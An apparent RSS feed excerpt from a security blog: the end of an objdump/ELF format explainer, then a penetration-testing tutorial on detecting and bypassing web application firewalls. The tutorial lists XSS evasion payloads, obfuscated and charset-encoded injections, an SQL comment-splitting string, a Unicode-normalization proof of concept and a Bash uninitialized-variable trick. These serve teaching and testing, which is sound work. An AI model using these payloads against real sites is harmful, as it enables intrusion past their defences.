&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;DT_PLTGOT&lt;/strong&gt; Address of PLT and/or GOT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In the above code block, the address of the Procedure Linkage Table (PLT) and/or Global Offset Table (GOT) table would be stored at the memory address &lt;code&gt;0x0000000000601000&lt;/code&gt; as shown by the fact that they are in the same row and the values correspond.&lt;/p&gt;
&lt;h2 id=&#34;version-references&#34;&gt;Version References&lt;/h2&gt;
&lt;p&gt;This section lists the versions of the dynamically linked libraries that are required for the program to run.&lt;/p&gt;
&lt;p&gt;These versions are determined by the linker and requiring them allows for the program to run properly since the library versions used will be compatible with the Application Binary Interface (ABI).&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Version References:  
 required from libc.so.6:  
 0x0d696917 0x00 04 GLIBC\_2.7  
 0x0d696914 0x00 03 GLIBC\_2.4  
 0x09691a75 0x00 02 GLIBC\_2.2.5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this example, the output indicates that the binary depends on 3 different GLIBC versions: 2.7, 2.4, and 2.2.5.&lt;/p&gt;
&lt;h2 id=&#34;sections&#34;&gt;Sections&lt;/h2&gt;
&lt;p&gt;This segment of output contains information about the memory location and names of various different sections of the program. This information is useful to the linker since it helps with symbol resolution, relocation to ensure that they reference the correct addresses in memory, and more such as pointing to the program’s initialization and finalization routines.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Sections:  
Idx Name Size VMA LMA File off Algn  
 0 .interp 0000001c 0000000000400238 0000000000400238 00000238 2**0  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 1 .note.ABI-tag 00000020 0000000000400254 0000000000400254 00000254 2**2  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 2 .note.gnu.build-id 00000024 0000000000400274 0000000000400274 00000274 2**2  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 3 .gnu.hash 00000024 0000000000400298 0000000000400298 00000298 2**3  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 4 .dynsym 00000150 00000000004002c0 00000000004002c0 000002c0 2**3  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 5 .dynstr 000000a8 0000000000400410 0000000000400410 00000410 2**0  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 6 .gnu.version 0000001c 00000000004004b8 00000000004004b8 000004b8 2**1  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 7 .gnu.version\_r 00000040 00000000004004d8 00000000004004d8 000004d8 2**3  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 8 .rela.dyn 00000048 0000000000400518 0000000000400518 00000518 2**3  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 9 .rela.plt 000000f0 0000000000400560 0000000000400560 00000560 2**3  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 10 .init 00000017 0000000000400650 0000000000400650 00000650 2**2  
 CONTENTS, ALLOC, LOAD, READONLY, CODE  
 11 .plt 000000b0 0000000000400670 0000000000400670 00000670 2**4  
 CONTENTS, ALLOC, LOAD, READONLY, CODE  
 12 .text 000003d2 0000000000400720 0000000000400720 00000720 2**4  
 CONTENTS, ALLOC, LOAD, READONLY, CODE  
 13 .fini 00000009 0000000000400af4 0000000000400af4 00000af4 2**2  
 CONTENTS, ALLOC, LOAD, READONLY, CODE  
 14 .rodata 00000057 0000000000400b00 0000000000400b00 00000b00 2**3  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 15 .eh\_frame\_hdr 0000003c 0000000000400b58 0000000000400b58 00000b58 2**2  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 16 .eh\_frame 00000100 0000000000400b98 0000000000400b98 00000b98 2**3  
 CONTENTS, ALLOC, LOAD, READONLY, DATA  
 17 .init\_array 00000008 0000000000600e00 0000000000600e00 00000e00 2**3  
 CONTENTS, ALLOC, LOAD, DATA  
 18 .fini\_array 00000008 0000000000600e08 0000000000600e08 00000e08 2**3  
 CONTENTS, ALLOC, LOAD, DATA  
 19 .dynamic 000001e0 0000000000600e10 0000000000600e10 00000e10 2**3  
 CONTENTS, ALLOC, LOAD, DATA  
 20 .got 00000010 0000000000600ff0 0000000000600ff0 00000ff0 2**3  
 CONTENTS, ALLOC, LOAD, DATA  
 21 .got.plt 00000068 0000000000601000 0000000000601000 00001000 2**3  
 CONTENTS, ALLOC, LOAD, DATA  
 22 .data 00000010 0000000000601068 0000000000601068 00001068 2**3  
 CONTENTS, ALLOC, LOAD, DATA  
 23 .bss 00000010 0000000000601078 0000000000601078 00001078 2**3  
 ALLOC  
 24 .comment 00000029 0000000000000000 0000000000000000 00001078 2**0  
 CONTENTS, READONLY
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let’s break down the meaning of the new columns:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Size&lt;/strong&gt;: The size of the section in bytes&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VMA&lt;/strong&gt;: The virtual memory address that the section will be loaded into during program execution&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;LMA&lt;/strong&gt;: The load memory address or the memory address that which the section will be loaded in physical memory&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Each of the sections listed in the output serves a particular purpose in the program. For instance, the &lt;code&gt;.bss&lt;/code&gt; section contains uninitiated global variables and &lt;code&gt;.gnu_hash&lt;/code&gt; is the hash table used for efficient symbol lookup in the dynamic linking process. The full meanings of the different sections can be found &lt;a href=&#34;https://refspecs.linuxbase.org/elf/gabi4+/ch4.sheader.html&#34;&gt;at this link&lt;/a&gt; towards the bottom of the page.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A note on terminology: the ELF file used by the linker are called “sections” and the parts used by the loader are called “segments”.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;symbol-table&#34;&gt;Symbol Table&lt;/h2&gt;
&lt;p&gt;Finally, the symbol contains information useful for locating and relocating a program’s symbolic definitions and references. It helps in symbol resolution, linking, and debugging.&lt;/p&gt;
&lt;p&gt;Symbols are segments of code or information such as functions and variables that can be reused by the program. A symbol table keeps track of the different symbols and their locations.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SYMBOL TABLE:  
0000000000400238 l d .interp 0000000000000000 .interp  
0000000000400254 l d .note.ABI-tag 0000000000000000 .note.ABI-tag  
0000000000400274 l d .note.gnu.build-id 0000000000000000 .note.gnu.build-id  
0000000000400298 l d .gnu.hash 0000000000000000 .gnu.hash  
00000000004002c0 l d .dynsym 0000000000000000 .dynsym  
0000000000400410 l d .dynstr 0000000000000000 .dynstr  
00000000004004b8 l d .gnu.version 0000000000000000 .gnu.version  
00000000004004d8 l d .gnu.version\_r 0000000000000000 .gnu.version\_r  
0000000000400518 l d .rela.dyn 0000000000000000 .rela.dyn  
0000000000400560 l d .rela.plt 0000000000000000 .rela.plt  
0000000000400650 l d .init 0000000000000000 .init  
0000000000400670 l d .plt 0000000000000000 .plt  
0000000000400720 l d .text 0000000000000000 .text  
0000000000400af4 l d .fini 0000000000000000 .fini  
0000000000400b00 l d .rodata 0000000000000000 .rodata  
0000000000400b58 l d .eh\_frame\_hdr 0000000000000000 .eh\_frame\_hdr  
0000000000400b98 l d .eh\_frame 0000000000000000 .eh\_frame  
0000000000600e00 l d .init\_array 0000000000000000 .init\_array  
0000000000600e08 l d .fini\_array 0000000000000000 .fini\_array  
0000000000600e10 l d .dynamic 0000000000000000 .dynamic  
0000000000600ff0 l d .got 0000000000000000 .got  
0000000000601000 l d .got.plt 0000000000000000 .got.plt  
0000000000601068 l d .data 0000000000000000 .data  
0000000000601078 l d .bss 0000000000000000 .bss  
0000000000000000 l d .comment 0000000000000000 .comment  
0000000000000000 l df *ABS* 0000000000000000 crtstuff.c  
0000000000400760 l F .text 0000000000000000 deregister\_tm\_clones  
0000000000400790 l F .text 0000000000000000 register\_tm\_clones  
00000000004007d0 l F .text 0000000000000000 \_\_do\_global\_dtors\_aux  
0000000000601080 l O .bss 0000000000000001 completed.7698  
0000000000600e08 l O .fini\_array 0000000000000000 \_\_do\_global\_dtors\_aux\_fini\_array\_entry  
0000000000400800 l F .text 0000000000000000 frame\_dummy  
0000000000600e00 l O .init\_array 0000000000000000 \_\_frame\_dummy\_init\_array\_entry  
0000000000000000 l df *ABS* 0000000000000000 heapedit.c  
0000000000000000 l df *ABS* 0000000000000000 crtstuff.c  
0000000000400c94 l O .eh\_frame 0000000000000000 \_\_FRAME\_END\_\_  
0000000000000000 l df *ABS* 0000000000000000   
0000000000600e08 l .init\_array 0000000000000000 \_\_init\_array\_end  
0000000000600e10 l O .dynamic 0000000000000000 \_DYNAMIC  
0000000000600e00 l .init\_array 0000000000000000 \_\_init\_array\_start  
0000000000400b58 l .eh\_frame\_hdr 0000000000000000 \_\_GNU\_EH\_FRAME\_HDR  
0000000000601000 l O .got.plt 0000000000000000 \_GLOBAL\_OFFSET\_TABLE\_  
0000000000400af0 g F .text 0000000000000002 \_\_libc\_csu\_fini  
0000000000000000 F *UND* 0000000000000000 free@@GLIBC\_2.2.5  
0000000000601078 g O .bss 0000000000000008 stdout@@GLIBC\_2.2.5  
0000000000601068 w .data 0000000000000000 data\_start  
0000000000000000 F *UND* 0000000000000000 puts@@GLIBC\_2.2.5  
0000000000601078 g .data 0000000000000000 \_edata  
0000000000400af4 g F .fini 0000000000000000 \_fini  
0000000000000000 F *UND* 0000000000000000 \_\_stack\_chk\_fail@@GLIBC\_2.4  
0000000000000000 F *UND* 0000000000000000 setbuf@@GLIBC\_2.2.5  
0000000000000000 F *UND* 0000000000000000 printf@@GLIBC\_2.2.5  
0000000000000000 F *UND* 0000000000000000 \_\_libc\_start\_main@@GLIBC\_2.2.5  
0000000000000000 F *UND* 0000000000000000 fgets@@GLIBC\_2.2.5  
0000000000601068 g .data 0000000000000000 \_\_data\_start  
0000000000000000 w *UND* 0000000000000000 \_\_gmon\_start\_\_  
0000000000601070 g O .data 0000000000000000 .hidden \_\_dso\_handle  
0000000000400b00 g O .rodata 0000000000000004 \_IO\_stdin\_used  
0000000000400a80 g F .text 0000000000000065 \_\_libc\_csu\_init  
0000000000000000 F *UND* 0000000000000000 malloc@@GLIBC\_2.2.5  
0000000000601088 g .bss 0000000000000000 \_end  
0000000000400750 g F .text 0000000000000002 .hidden \_dl\_relocate\_static\_pie  
0000000000400720 g F .text 000000000000002b \_start  
0000000000601078 g .bss 0000000000000000 \_\_bss\_start  
0000000000400807 g F .text 0000000000000277 main  
0000000000000000 F *UND* 0000000000000000 fopen@@GLIBC\_2.2.5  
0000000000000000 F *UND* 0000000000000000 \_\_isoc99\_scanf@@GLIBC\_2.7  
0000000000000000 F *UND* 0000000000000000 strcat@@GLIBC\_2.2.5  
0000000000601078 g O .data 0000000000000000 .hidden \_\_TMC\_END\_\_  
0000000000400650 g F .init 0000000000000000 \_init
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The leftmost column is the memory address of the symbol. The next section represents 7 types of flags that the program can have. For instance, the first row containing the symbol &lt;code&gt;.interpret&lt;/code&gt; has the flags “l” and “d”. The meaning of these can be found in the &lt;code&gt;objdump&lt;/code&gt; &lt;a href=&#34;https://linux.die.net/man/1/objdump&#34;&gt;man page&lt;/a&gt; in the &lt;code&gt;--syms&lt;/code&gt; section. For instance, the flags on &lt;code&gt;.interpret&lt;/code&gt; indicate that the symbol is &lt;strong&gt;l&lt;/strong&gt;ocal (only visible within the object file) and is a &lt;strong&gt;d&lt;/strong&gt;ebugging symbol.&lt;/p&gt;
&lt;p&gt;The structure of each entry in the symbol table is defined in the header file &lt;code&gt;sys/elf.h&lt;/code&gt; or here:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct {  
 Elf32\_Word st\_name;  
 Elf32\_Addr st\_value;  
 Elf32\_Word st\_size;  
 unsigned char st\_info;  
 unsigned char st\_other;  
 Elf32\_Half st\_shndx;  
} Elf32\_Sym;  
  
typedef struct {  
 Elf64\_Word st\_name;  
 unsigned char st\_info;  
 unsigned char st\_other;  
 Elf64\_Half st\_shndx;  
 Elf64\_Addr st\_value;  
 Elf64\_Xword st\_size;  
} Elf64\_Sym;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The format of an ELF object file allows for reliable access to important details that aid in program execution such as dynamic linking and storing variables. Tools like &lt;code&gt;objdump&lt;/code&gt; aid in revealing and understanding these pieces of information and the connections between them.&lt;/p&gt;
&lt;h1 id=&#34;more-reading&#34;&gt;More Reading&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-46512.html#scrolltoc&#34;&gt;Oracle Documentation&lt;/a&gt; on ELF object file format&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://linux.die.net/man/1/objdump&#34;&gt;Objdump Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://linux.die.net/man/1/elf&#34;&gt;Elf Man Page&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>5 Ways I Bypassed Your Web Application Firewall (WAF)</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/</link>
      <pubDate>Thu, 01 Jun 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/</guid>
      <description>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.&lt;/p&gt;
&lt;p&gt;WAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.&lt;/p&gt;
&lt;p&gt;Depending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic. Regular expressions are used to detect patterns in a string of characters. You can read more about them &lt;a href=&#34;https://docs.python.org/3/library/re.html&#34;&gt;here&lt;/a&gt;. WAFs may also employ signature-based detection, where known malicious strings are given a signature that is stored in a database and the firewall will check the signature of the web traffic against the contents of the database. If there is a match, the traffic is blocked. Additionally, some firewalls use heuristic-based detection.&lt;/p&gt;
&lt;h1 id=&#34;identifying-wafs&#34;&gt;Identifying WAFs&lt;/h1&gt;
&lt;h2 id=&#34;manually&#34;&gt;Manually&lt;/h2&gt;
&lt;p&gt;As stated previously, WAFs will often block overtly malicious traffic. In order to trigger a firewall and verify its existence, an HTTP request can be made to the web application with a malicious query in the URL such as &lt;code&gt;https://example.com/?p4yl04d3=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;. The HTTP response may be different than expected for the webpage that is being visited. The WAF may return its own webpage such as the one shown below or a different status code, typically in the 400s.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*lDR9M2gtJzPvOdWg&#34; alt=&#34;Picture of Cloudflare firewall blocking a webpage.&#34;  /&gt;

Through a web proxy, cURL, or the “Network” tab of your browser’s DevTools additional indications of a firewall can be detected:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The name of the WAF in the &lt;code&gt;Server&lt;/code&gt; header (e.g. &lt;code&gt;Server: cloudflare&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Additional HTTP response headers associated with the WAF (e.g. &lt;code&gt;CF-RAY: xxxxxxxxxxx&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Cookies that appear to be set by a WAF (e.g. the response header&lt;code&gt;Set-Cookie: __cfduid=xxxxx&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Unique response code upon submitting malicious requests. (e.g. &lt;code&gt;412&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Aside from crafting malicious queries and evaluating the response, firewalls can also be detected by sending a &lt;code&gt;FIN/RST&lt;/code&gt; TCP packet to the server or implemening a side-channel attack. For instance, the timing of the firewall against different payloads can give hints as to the WAF being used.&lt;/p&gt;
&lt;h2 id=&#34;automations&#34;&gt;Automations&lt;/h2&gt;
&lt;p&gt;There are 3 automated methods of detecting and identifying WAFs that will be discussed in this article.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Running an Nmap Scan&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The Nmap Scripting Engine (NSE) includes scripts for detecting and fingerprinting firewalls. These scripts can be seen in use below.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 21:43 PDT  
Nmap scan report for example.com (xxx.xxx.xxx.xxx)  
Host is up (0.20s latency).  
  
PORT STATE SERVICE  
443/tcp open https  
| http-waf-detect: IDS/IPS/WAF detected:  
|\_example.com:443/?p4yl04d3=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;  
  
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Ekultek/WhatWaf&#34;&gt;WafW00f&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Wafw00f is a command line utility that sends commonly-flagged payloads to the given domain name and assess the web server’s response to detect and identify the firewall when possible.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ wafw00f example.com 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8zeEz07TxwZ8VGBIaqxVvA.png&#34; alt=&#34;&#34;  /&gt;

3. &lt;a href=&#34;https://github.com/Ekultek/WhatWaf&#34;&gt;WhatWaf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In addition to detecting a firewall, WhatWaf can attempt to discover a bypass by utilizing tamper scripts and assessing the web server’s response to the various payloads.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_pCVKq8cL3ZTghqWG5BAyQ.png&#34; alt=&#34;&#34;  /&gt;

The results from WhatWaf are consistent with those of Wafw00f.&lt;/p&gt;
&lt;h1 id=&#34;bypassing-wafs&#34;&gt;Bypassing WAFs&lt;/h1&gt;
&lt;p&gt;This section will outline some of the potential WAF bypass techniques with examples.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Bypassing Regex&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;This method applies to the regex filtering done by both the WAF and web server. During a black box penetration test, finding the regular expression used by the WAF may not be an option. If the regex is accessible, this &lt;a href=&#34;https://www.secforce.com/blog/bypassing-wafs-web-application-filters/&#34;&gt;article&lt;/a&gt; explains regex bypass through case studies.&lt;/p&gt;
&lt;p&gt;Commmon bypasses include changing the case of the payload, using various encodings, substituting functions or characters, using an alternative syntax, and using &lt;a href=&#34;https://www.aleksandrhovhannisyan.com/blog/crlf-vs-lf-normalizing-line-endings-in-git/&#34;&gt;linebreaks&lt;/a&gt; or tabs. The examples below demonstrate some approaches to bypassing regex with comments.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(XSS)&amp;lt;/sCriPt&amp;gt; #changing the case of the tag  
&amp;lt;&amp;lt;script&amp;gt;alert(XSS)&amp;lt;/script&amp;gt; #prepending an additional &amp;#34;&amp;lt;&amp;#34;  
&amp;lt;script&amp;gt;alert(XSS) // #removing the closing tag  
&amp;lt;script&amp;gt;alert`XSS`&amp;lt;/script&amp;gt; #using backticks instead of parenetheses  
java%0ascript:alert(1) #using encoded newline characters  
&amp;lt;iframe src=http://malicous.com &amp;lt; #double open angle brackets  
&amp;lt;STYLE&amp;gt;.classname{background-image:url(&amp;#34;javascript:alert(XSS)&amp;#34;);}&amp;lt;/STYLE&amp;gt; #uncommon tags  
&amp;lt;img/src=1/onerror=alert(0)&amp;gt; #bypass space filter by using / where a space is expected  
&amp;lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)&amp;gt;xss&amp;lt;/a&amp;gt; #extra characters
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;obfuscation&#34;&gt;Obfuscation&lt;/h2&gt;
&lt;p&gt;While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Function(&amp;#34;ale&amp;#34;+&amp;#34;rt(1)&amp;#34;)(); #using uncommon functions besides alert, console.log, and prompt  
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding  
&amp;lt;iframe src=&amp;#34;javascript:alert(`xss`)&amp;#34;&amp;gt; #unicode encoding  
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement  
new Function`alt\`6\``; #using backticks instead of parentheses  
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript  
%26%2397;lert(1) #using HTML encoding  
&amp;lt;a src=&amp;#34;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)&amp;#34;&amp;gt; #Using Line Feed (LF) line breaks   
&amp;lt;BODY onload!#$%&amp;amp;()*~+-\_.,:;?@[/|\]^`=confirm()&amp;gt; # use any chars that aren&amp;#39;t letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Additional resources include &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads&#34;&gt;PayloadsAllTheThings&lt;/a&gt; and &lt;a href=&#34;https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html&#34;&gt;OWASP&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;2-charsethttpsbookhacktricksxyznetwork-services-pentestingpentesting-webwaf-bypass&#34;&gt;&lt;a href=&#34;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass&#34;&gt;2. Charset&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This technique involves modifying the &lt;code&gt;Content-Type&lt;/code&gt; header to use a different charset (e.g. &lt;code&gt;ibm500&lt;/code&gt;). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ python3  
-- snip --  
&amp;gt;&amp;gt;&amp;gt; import urllib.parse  
&amp;gt;&amp;gt;&amp;gt; s = &amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;xss&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;  
&amp;gt;&amp;gt;&amp;gt; urllib.parse.quote\_plus(s.encode(&amp;#34;IBM037&amp;#34;))  
&amp;#39;L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The encoded string can then be sent in the request body and uploaded to the server.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /comment/post HTTP/1.1  
Host: chatapp  
Content-Type: application/x-www-form-urlencoded; charset=ibm500  
Content-Length: 74  
  
%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Content Size&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Unicode Compatibility&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*khYe6n5QPB7ar2GG.jpg&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg&#34;&gt;http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Unicode Compatibility is a concept that describes the decomposition of visually distinct characters into the same basic abstract character. It is a form of &lt;a href=&#34;https://en.wikipedia.org/wiki/Unicode_equivalence&#34;&gt;unicode equivalence&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For instance, the characters&lt;code&gt;／&lt;/code&gt;(U+FF0F) and &lt;code&gt;/&lt;/code&gt; (U+002F) are different, but in some contexts they will have the same meaning as each other. The shared meaning allows for the characters are compatible with each other, meaning that they can both be translated to the standard forward-slash character&lt;code&gt;/&lt;/code&gt;(U+002F) despite starting out as different characters. Digging deeper, whether &lt;code&gt;／&lt;/code&gt;(U+FF0F) and &lt;code&gt;/&lt;/code&gt; (U+002F) will end up as the same forward-slash character depends on the way that they are normalized, or translated, by the web server.&lt;/p&gt;
&lt;p&gt;Characters are typically normalized through one of the four standard Unicode normalization algorithms:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;NFC:&lt;/strong&gt; Normalization Form Canonical Composition&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NFD:&lt;/strong&gt; Normalization Form Canonical Decomposition&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NFKC:&lt;/strong&gt; Normalization Form Compatibility Composition&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NFKD:&lt;/strong&gt; Normalization Form Compatibility Decomposition&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NFKC and NFKD in particular will decompose the characters by compatibility, which is unlike NFC and NFD (more details &lt;a href=&#34;https://www.unicode.org/reports/tr15/&#34;&gt;here&lt;/a&gt;). The implication is that on web servers where the user input is first sanitized, then normalized with either NFKC or NFKD, the unexpected, compatible characters can bypass the WAF and execute as their canonical equivalents on the backend. This is a result of the WAF not expecting unicode-compatible characters. &lt;a href=&#34;https://jlajara.gitlab.io/Bypass_WAF_Unicode&#34;&gt;Jorge Lahara&lt;/a&gt; demonstrates this in the PoC webserver below.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from flask import Flask, abort, request  
import unicodedata  
from waf import waf  
  
app = Flask(\_\_name\_\_)  
  
  
@app.route(&amp;#39;/&amp;#39;)  
def Welcome\_name():  
 name = request.args.get(&amp;#39;name&amp;#39;)  
  
  
 if waf(name):  
 abort(403, description=&amp;#34;XSS Detected&amp;#34;)  
 else:  
 name = unicodedata.normalize(&amp;#39;NFKD&amp;#39;, name) #NFC, NFKC, NFD, and NFKD  
 return &amp;#39;Test XSS: &amp;#39; + name  
  
if \_\_name\_\_ == &amp;#39;\_\_main\_\_&amp;#39;:  
 app.run(port=81)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Where the inial payload of &lt;code&gt;＜img src=p onerror=&#39;prompt(1)&#39;&amp;gt;&lt;/code&gt; may have been detected by the firewall, the payload constructed with Unicode-compatible characters (&lt;code&gt;＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥&lt;/code&gt;) would remain undetected.&lt;/p&gt;
&lt;p&gt;Web servers that normalize input after it has been sanitized may be vulnerable to WAF bypass through Unicode compatibility. Compatible characters can be found &lt;a href=&#34;https://www.compart.com/en/unicode&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Uninitialized Variables&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Another potential method is to use uninitialized variables in your request (e.g. &lt;code&gt;$u&lt;/code&gt;) as demonstrated in this &lt;a href=&#34;https://www.secjuice.com/web-application-firewall-waf-evasion/&#34;&gt;article&lt;/a&gt;. This is possible in command execution scenarios because Bash treats uninitialized variables as empty strings. When concatenating empty strings with a command payload, the result ends up being the command payload.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Dn2ov32HcZKKSE-4.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.secjuice.com/content/images/2018/08/image-3.png&#34;&gt;https://www.secjuice.com/content/images/2018/08/image-3.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;When on a system that is vulnerable to command injection, inserting uninitialized variables in the payload can act as a form of obfuscation, bypassing the firewalls.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*0jvcJnOSNRnOcYZJ.png&#34; alt=&#34;&#34;  /&gt;

